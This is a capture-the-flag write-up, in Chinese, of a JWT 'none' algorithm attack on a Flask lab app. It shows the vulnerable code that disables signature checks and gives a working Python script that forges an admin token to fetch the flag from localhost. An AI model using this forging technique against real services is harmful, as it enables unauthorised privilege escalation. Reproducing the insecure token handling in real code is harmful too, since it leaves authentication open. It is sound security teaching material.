# JWT None Algorithm Attack Writeup

## 1、题目描述

这是一个基于 Flask 的 Web 应用，存在 JWT 认证漏洞。应用有两个用户角色：普通用户(user)和管理员(admin)。只有管理员角色可以访问`/gettheflag`端点获取 flag。

## 2、知识点

- **JWT None Algorithm Attack**: JWT 支持将算法设置为"none",此时签名验证会被绕过
- **JWT Token 伪造**: 修改 JWT payload 中的角色字段
- **Cookie 操纵**: 通过修改 Cookie 中的 JWT token 提升权限

## 3、题目解题方法思路

**关键路径:**

1. 使用 user 账户登录获取初始 JWT token
2. 发现 JWT token 使用`algorithm="none"`且服务端`verify_signature=False`
3. 将 token 中的 role 从"user"修改为"admin"
4. 使用伪造的 admin token 访问`/gettheflag`获取 flag

**使用的知识点:** JWT None Algorithm 漏洞

**工具和方法:** Python requests 库、jwt 库、base64 编码

## 4、解题步骤

### 步骤 1: 分析源码漏洞点

```python
# 登录时生成token,algorithm="none"
token = jwt.encode(
    {"username": username, "role": users[username]["role"]},
    "",
    algorithm="none",
)

# 验证token时不验证签名
payload = jwt.decode(token, options={"verify_signature": False})
```

### 步骤 2: 使用 user 账户登录获取 token

访问`/login`,用户名`user`,密码`user`

### 步骤 3: 解析并修改 JWT token

JWT token 结构: `header.payload.signature`

- Header: `{"typ":"JWT","alg":"none"}`
- Payload: `{"username":"user","role":"user"}`
- 修改为: `{"username":"user","role":"admin"}`

### 步骤 4: 重新编码 JWT token

使用 base64 编码修改后的 payload

### 步骤 5: 使用伪造 token 访问/gettheflag

将 Cookie 中的 token 替换为伪造的 admin token,访问`/gettheflag`端点获取 flag

## 5、Exp

```python
import requests
import jwt

target_url = "http://localhost:5003"

session = requests.Session()

login_data = {
    "username": "user",
    "password": "user"
}

session.post(f"{target_url}/login", data=login_data)

original_token = session.cookies.get("token")
print(f"[+] Original Token: {original_token}")

payload = {
    "username": "user",
    "role": "admin"
}

admin_token = jwt.encode(payload, "", algorithm="none")
print(f"[+] Forged Admin Token: {admin_token}")

if "token" in session.cookies:
    del session.cookies["token"]

session.cookies.set("token", admin_token)

response = session.get(f"{target_url}/gettheflag")
flag = response.text
print(f"[+] Flag: {flag}")
```

**运行结果:**

```
[+] Original Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
[+] Forged Admin Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.
[+] Flag: flag{ffllaagg}
```
